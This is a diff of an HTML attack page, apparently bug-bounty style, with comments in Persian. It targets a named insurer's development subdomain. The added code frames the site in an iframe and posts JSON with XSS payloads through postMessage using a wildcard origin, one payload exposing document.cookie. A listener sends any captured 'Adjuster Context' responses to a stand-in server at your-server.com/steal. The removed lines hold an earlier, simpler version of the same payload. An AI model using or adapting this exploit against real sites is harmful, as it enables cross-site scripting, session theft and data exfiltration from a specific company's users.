@@ -1,11 +1,43 @@
-<iframe src="https://casers-dv1.geico.com/" id="vuln-iframe" onload="exploit()"></iframe>
-<script>
-  function exploit() {
-    var iframe = document.getElementById('vuln-iframe');
-    var payload = JSON.stringify({
-      action: "Initialized",  // تقلید از action اصلی
-      malicious: '<img src=x onerror=alert("XSS via postMessage!")>'  // payload XSS
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Malicious Exploit Server</title>
+</head>
+<body>
+  <h1>Testbed for postMessage Exploit</h1>
+  <iframe id="victim-iframe" src="https://casers-dv1.geico.com/" style="width:100%; height:500px; border:1px solid red;"></iframe>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      var iframe = document.getElementById('victim-iframe');
+      iframe.onload = function() {
+        // صبر کوتاه برای load کامل victim
+        setTimeout(function() {
+          // Payload JSON برای trigger action="Initialized" و inject XSS
+          var maliciousPayload = JSON.stringify({
+            action: "Initialized",
+            // Payload XSS که اگر parse و inject بشه (مثل innerHTML یا eval در Flutter)، اجرا می‌شه
+            userInput: '<script>alert("XSS Exploit Successful! Origin: " + window.location.href + "\\nCookies: " + document.cookie);</script>',
+            // یا ساده‌تر: '"><img src=x onerror=alert(document.domain)>'
+            extraData: "Malicious data to pollute"
+          });
+          
+          // Post به victim iframe (wildcard origin bypass)
+          iframe.contentWindow.postMessage(maliciousPayload, "*");
+          
+          console.log("Payload sent! Check victim console for parse/log.");
+          
+          // Capture response از victim برای leak data
+          window.addEventListener('message', function(e) {
+            console.log("Leaked from victim:", e.data);
+            // اگر response حساس باشه (مثل token)، اینجا steal کن
+            if (e.data && e.data.includes('Adjuster Context')) {
+              fetch('https://your-server.com/steal?data=' + encodeURIComponent(e.data))
+                .then(() => console.log('Data leaked!'));
+            }
+          });
+        }, 2000);  // 2 ثانیه delay برای init
+      };
     });
-    iframe.contentWindow.postMessage(payload, "*");
-  }
-</script>
+  </script>
+</body>
+</html>
